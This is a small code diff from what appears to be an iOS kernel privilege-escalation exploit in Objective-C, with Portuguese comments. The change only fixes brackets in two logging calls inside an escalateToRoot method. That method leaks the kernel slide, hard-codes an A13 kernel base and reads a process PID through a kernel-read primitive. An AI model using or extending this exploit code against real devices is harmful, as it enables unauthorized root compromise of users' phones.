@@ -113,7 +113,7 @@ extern char **environ;
 
 - (BOOL)escalateToRoot {
     uint64_t slide = [self leakKernelSlide]; // 0x21000000 detectado
-    [self logToWeb:[NSString stringWithFormat:@"✅ Slide: %d", slide)];
+    [self logToWeb:[NSString stringWithFormat:@"✅ Slide: %d", slide]];
     
     // No iOS 26.3 (A13), tente a base exata de 16KB
     #define KERN_BASE_A13 0xFFFFFFF007004000ULL 
@@ -129,7 +129,7 @@ extern char **environ;
         // Agora sim, desmascare para ver o PID no 0x68
         proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
         uint32_t pid = [self kread32:(proc + 0x68)];
-        [self logToWeb:[NSString stringWithFormat:@"✅ PID em 0x68: %d", pid)];
+        [self logToWeb:[NSString stringWithFormat:@"✅ PID em 0x68: %d", pid]];
     }
     
     return NO;
